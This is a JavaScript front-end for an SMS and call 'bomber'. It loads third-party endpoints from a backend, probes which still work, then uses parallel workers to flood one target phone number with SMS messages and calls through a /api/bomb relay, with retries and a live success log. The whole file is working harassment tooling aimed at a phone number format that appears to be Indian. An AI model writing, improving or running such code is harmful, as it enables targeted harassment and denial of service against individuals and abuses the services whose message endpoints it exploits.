'use strict';

let endpoints = [];         // [{id, type}]
let health = new Map();     // id -> { ok, fail, dead }
let running = false;
let probing = false;
let stats = { sent: 0, fail: 0, active: 0, startedAt: 0 };
let abortController = null;

const $ = id => document.getElementById(id);
const targetEl = $('target');
const perEndpointEl = $('perEndpoint');
const delayEl = $('delay');
const workersEl = $('workers');
const endpointCountEl = $('endpointCount');
const startBtn = $('startBtn');
const stopBtn = $('stopBtn');
const probeBtn = $('probeBtn');
const logEl = $('log');

const FAIL_LIMIT = 3;   // after 3 consecutive fails → mark dead
const PROBE_TIMEOUT_MS = 4000;

function log(msg, cls = 'info') {
  const t = new Date().toLocaleTimeString('en-GB', { hour12: false });
  const line = document.createElement('div');
  line.className = cls;
  line.textContent = `[${t}] ${msg}`;
  logEl.appendChild(line);
  logEl.scrollTop = logEl.scrollHeight;
  while (logEl.children.length > 500) logEl.removeChild(logEl.firstChild);
}

function renderStats() {
  $('statSent').textContent = stats.sent;
  $('statFail').textContent = stats.fail;
  $('statActive').textContent = stats.active;
  const elapsed = stats.startedAt ? ((Date.now() - stats.startedAt) / 1000).toFixed(1) + 's' : '0s';
  $('statTime').textContent = elapsed;
}

async function fetchEndpoints() {
  const res = await fetch('/api/stats');
  if (!res.ok) throw new Error(`stats failed (${res.status})`);
  const data = await res.json();
  return data.endpoints || [];
}

function recordResult(endpointId, ok) {
  const h = health.get(endpointId) || { ok: 0, fail: 0, dead: false };
  if (ok) {
    h.ok++;
    h.fail = 0;
    h.dead = false;
  } else {
    h.fail++;
    if (h.fail >= FAIL_LIMIT) h.dead = true;
  }
  health.set(endpointId, h);
}

function isDead(endpointId) {
  const h = health.get(endpointId);
  return h && h.dead;
}

function aliveCount() {
  return endpoints.filter(e => !isDead(e.id)).length;
}

// ═══════════════════════════════════════════════════════════════════
//  PROBE — 1 request per endpoint, mark dead/alive
// ═══════════════════════════════════════════════════════════════════
async function fireProbe(endpointId, phone) {
  try {
    const controller = new AbortController();
    const tid = setTimeout(() => controller.abort(), PROBE_TIMEOUT_MS);

    const res = await fetch('/api/bomb', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ endpointId, phone }),
      signal: controller.signal
    });
    clearTimeout(tid);

    const data = await res.json();
    return data;
  } catch (err) {
    return { ok: false, endpoint: endpointId, upstreamStatus: 'network_error', error: err.message };
  }
}

async function probe() {
  if (probing || running) return;
  const phone = targetEl.value.trim();

  if (!/^[6-9]\d{9}$/.test(phone)) {
    log('✗ enter valid number before probing', 'fail');
    return;
  }

  probing = true;
  probeBtn.disabled = true;
  probeBtn.textContent = 'PROBING…';

  health = new Map();
  log(`◎ probing ${endpoints.length} endpoints…`, 'info');

  // probe in batches of 6 (parallel)
  const batchSize = 6;
  for (let i = 0; i < endpoints.length; i += batchSize) {
    const batch = endpoints.slice(i, i + batchSize);
    const results = await Promise.all(batch.map(e => fireProbe(e.id, phone)));

    for (const r of results) {
      recordResult(r.endpoint, r.ok);
      const tag = r.ok ? '✓' : '✗';
      const cls = r.ok ? 'ok' : 'fail';
      const type = endpoints.find(e => e.id === r.endpoint)?.type || '?';
      log(`${tag} probe ${r.endpoint} [${type}] → ${r.upstreamStatus} (${r.latencyMs || 0}ms)`, cls);
    }
  }

  const alive = aliveCount();
  const dead = endpoints.length - alive;
  endpointCountEl.value = `${alive}/${endpoints.length} alive`;
  log(`◎ probe done — ${alive} alive, ${dead} dead`, alive > 0 ? 'ok' : 'fail');

  probing = false;
  probeBtn.disabled = false;
  probeBtn.textContent = 'PROBE';
}

// ═══════════════════════════════════════════════════════════════════
//  FIRE ONE — skips dead endpoints
// ═══════════════════════════════════════════════════════════════════
async function fireOne(endpointId, phone, retries = 1) {
  if (!running) return;
  if (isDead(endpointId)) return;

  stats.active++;
  renderStats();

  let shouldRetry = false;

  try {
    const res = await fetch('/api/bomb', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ endpointId, phone }),
      signal: abortController?.signal
    });

    const data = await res.json();
    recordResult(endpointId, data.ok);

    if (data.ok) {
      stats.sent++;
      const type = data.type === 'call' ? 'CALL' : 'SMS';
      log(`✓ ${endpointId} [${type}] → ${data.upstreamStatus} (${data.latencyMs}ms)`, 'ok');
    } else if (
      (data.upstreamStatus === 'timeout' || data.upstreamStatus === 'network_error') &&
      retries > 0 &&
      !isDead(endpointId)
    ) {
      shouldRetry = true;
      log(`↻ ${endpointId} → retry after ${data.upstreamStatus}`, 'info');
    } else {
      stats.fail++;
      log(`✗ ${endpointId} → ${data.upstreamStatus} (${data.latencyMs}ms)`, 'fail');
    }
  } catch (err) {
    if (err.name === 'AbortError') {
      log(`⏹ ${endpointId} → aborted`, 'info');
    } else {
      stats.fail++;
      recordResult(endpointId, false);
      log(`✗ ${endpointId} → ${err.message}`, 'fail');
    }
  } finally {
    stats.active--;
    renderStats();
  }

  if (shouldRetry) {
    await new Promise(r => setTimeout(r, 300));
    return fireOne(endpointId, phone, retries - 1);
  }
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

async function worker(phone, perEndpoint, delay, queueRef) {
  while (running) {
    const alive = endpoints.filter(e => !isDead(e.id));
    if (!alive.length) return;

    const idx = queueRef.i++;
    if (idx >= alive.length * perEndpoint) return;

    const endpoint = alive[idx % alive.length];
    await fireOne(endpoint.id, phone);
    if (delay > 0) await sleep(delay);
  }
}

function validate(number) {
  return /^[6-9]\d{9}$/.test(number);
}

// ═══════════════════════════════════════════════════════════════════
//  RUN
// ═══════════════════════════════════════════════════════════════════
async function runBombing() {
  const phone = targetEl.value.trim();
  const perEndpoint = Math.max(1, parseInt(perEndpointEl.value, 10) || 1);
  const delay = Math.max(0, parseInt(delayEl.value, 10) || 0);
  const workers = Math.max(1, Math.min(20, parseInt(workersEl.value, 10) || 1));

  if (!validate(phone)) {
    log('✗ invalid number — 10 digits, starts 6-9', 'fail');
    return;
  }

  if (!endpoints.length) {
    log('✗ endpoints not loaded — refresh page', 'fail');
    return;
  }

  const alive = endpoints.filter(e => !isDead(e.id));
  if (!alive.length) {
    log('✗ no alive endpoints — run PROBE first', 'fail');
    return;
  }

  running = true;
  abortController = new AbortController();
  stats = { sent: 0, fail: 0, active: 0, startedAt: Date.now() };
  renderStats();

  startBtn.disabled = true;
  stopBtn.disabled = false;
  probeBtn.disabled = true;

  const callN = alive.filter(e => e.type === 'call').length;
  const smsN = alive.filter(e => e.type === 'sms').length;

  log(`▶ starting → ${phone} | ${perEndpoint}x × ${alive.length} alive (${smsN} SMS, ${callN} CALL) | ${workers} workers | ${delay}ms`, 'info');

  const queueRef = { i: 0 };
  const timer = setInterval(renderStats, 200);

  try {
    const promises = [];
    for (let w = 0; w < workers; w++) {
      promises.push(worker(phone, perEndpoint, delay, queueRef));
    }
    await Promise.all(promises);
  } finally {
    clearInterval(timer);
    running = false;
    startBtn.disabled = false;
    stopBtn.disabled = true;
    probeBtn.disabled = false;
    renderStats();
    log(`■ done — ${stats.sent} sent, ${stats.fail} failed | ${aliveCount()} still alive`, 'info');
  }
}

startBtn.addEventListener('click', runBombing);
probeBtn.addEventListener('click', probe);

stopBtn.addEventListener('click', () => {
  if (!running) return;
  running = false;
  abortController?.abort();
  log('⏹ stop requested', 'fail');
});

$('clearLog').addEventListener('click', () => { logEl.innerHTML = ''; });

(async () => {
  try {
    endpoints = await fetchEndpoints();
    endpointCountEl.value = `${endpoints.length} loaded`;
    const callN = endpoints.filter(e => e.type === 'call').length;
    const smsN = endpoints.filter(e => e.type === 'sms').length;
    log(`✓ ready — ${endpoints.length} endpoints (${smsN} SMS, ${callN} CALL)`, 'ok');
  } catch (err) {
    endpointCountEl.value = 'failed';
    log(`✗ could not load endpoints: ${err.message}`, 'fail');
  }
})();
